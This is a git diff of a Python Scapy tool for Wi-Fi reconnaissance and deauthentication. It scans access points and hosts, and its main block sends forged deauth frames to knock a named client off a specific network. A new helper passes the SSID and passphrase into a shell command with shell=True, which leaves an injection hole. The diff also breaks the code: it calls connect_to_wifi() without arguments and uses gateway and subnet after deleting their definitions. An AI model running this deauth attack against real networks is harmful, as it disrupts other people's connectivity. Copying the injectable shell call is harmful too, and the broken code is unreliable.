@@ -47,6 +47,10 @@ def lookup_iface() -> list[NetworkInterface]:
     return iface_list
 
 
+def connect_to_wifi(ssid, passphrase):
+    command = f'netsh wlan connect ssid="{ssid}" name="{ssid}" key="{passphrase}" interface="Wi-Fi"'
+    subprocess.run(command, shell=True)
+
 # Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
 #   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
 #   [Output] None
@@ -54,9 +58,10 @@ def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = 
     if broadcast:
         client_MAC = 'ff:ff:ff:ff:ff:ff'
     deauth_packet = (RadioTap()
-                     / Dot11(type=0, subtype=12, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
+                     / Dot11(addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
                      / Dot11Deauth(reason=7))
     iface.setmonitor(True)
+    set_channel(network.channel, iface)
     sendp(deauth_packet, iface=iface, monitor=True, count=100, inter=0.1)
     iface.setmonitor(False)
 
@@ -64,7 +69,7 @@ def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = 
 # Change the channel of the target network interface. (Only works in monitor mode.)
 #   [Input] Channel number, Target interface
 #   [Output] Success or failure
-def switch_channel(num: int, iface=conf.iface) -> bool:
+def set_channel(num: int, iface=conf.iface) -> bool:
     if not iface.ismonitor():
         print("Cannot change channel. First you need to switch your iface to monitor mode.")
         return False
@@ -122,8 +127,9 @@ def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = Fa
         # Sequential channel switching - Stays for 1 second on each channel
         current_channel = n
         print('Current channel: %d' % n)
-        switch_channel(n, iface)
-        sniff(iface=iface, monitor=True, timeout=1, prn=handle_scan_AP, store=0)
+        set_channel(n, iface)
+        # 비콘 프레임은 보통 100ms마다 송신되기 때문에 timeout=0.1~0.2여도 충분할 것 같다.
+        sniff(iface=iface, monitor=True, timeout=0.5, prn=handle_scan_AP, store=0)
     iface.setmonitor(False)
     return network_list
 
@@ -147,19 +153,19 @@ def _scan_host_MAC(network: Network, iface=conf.iface) -> list[dict]:
             if packet.haslayer(Dot11):
                 if (packet.type == 0 and packet.subtype == 4  # Probe Request Frame (Occurs only on new connection)
                         and packet.addr3 == network.bssid):
-                    if packet.addr2 not in [host.bssid for host in host_list]:
+                    if packet.addr2 not in [host.MAC for host in host_list]:
                         host_list.append(Host(network.bssid, packet.addr2, ''))
                         print(host_list[-1])
                 elif (packet.type == 2  # Data Frame
                       and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
-                    if packet.addr2 not in [host.bssid for host in host_list]:
+                    if packet.addr2 not in [host.MAC for host in host_list]:
                         host_list.append(Host(network.bssid, packet.addr2, ''))
                         print(host_list[-1])
         except (KeyError, TypeError) as e:  # Probably a malformed packet
             ...
 
     iface.setmonitor(True)
-    switch_channel(network.channel, iface)
+    set_channel(network.channel, iface)
     sniff(iface=iface, monitor=True, timeout=10, prn=handle_scan_host_MAC, store=0)
     iface.setmonitor(False)
     return host_list
@@ -174,8 +180,8 @@ def _scan_host_IP(host_list: list[Host], network: Network, iface=conf.iface) -> 
 
 # SScan IP with ARP Request/Response within subnet range
 def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=conf.iface):
-    gateway = network.gateway if network.gateway is not None else '192.168.0.1'
-    subnet = network.subnet if network.subnet is not None else 24
+    connect_to_wifi()
+
     ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
                    / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(gateway, subnet))[0])
     answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
@@ -197,8 +203,15 @@ def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=conf.iface)
 if __name__ == '__main__':
     iface_list = lookup_iface()
     iface = next((i for i in iface_list if i.description == '802.11n USB Wireless LAN Card'), None)
-    network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
-    # scan_AP(frequency='2.4ghz', iface=iface)
-    # scan_host(network=Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}), iface=iface)
-    # _find_MAC_from_IP([], network=, iface=iface)
-    disconnect_client(network, client_MAC='02:75:38:b4:89:38', iface=iface)
+    # network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
+    network = Network('cse-410', '58:86:94:56:0f:76', 1, {'WPA2/PSK'}, '192.168.0.1', 24)
+    '''
+    network_list = scan_AP(frequency='2.4ghz', iface=iface)
+    network = next((network for network in network_list if network.ssid == 'cse-410'), None)
+    if network.gateway is None:
+        network.gateway = '192.168.0.1'
+    if network.subnet is None:
+        network.subnet = 24
+    '''
+    scan_host(network=network, iface=iface)
+    disconnect_client(network=network, client_MAC='04:29:2e:79:4a:12', iface=iface)
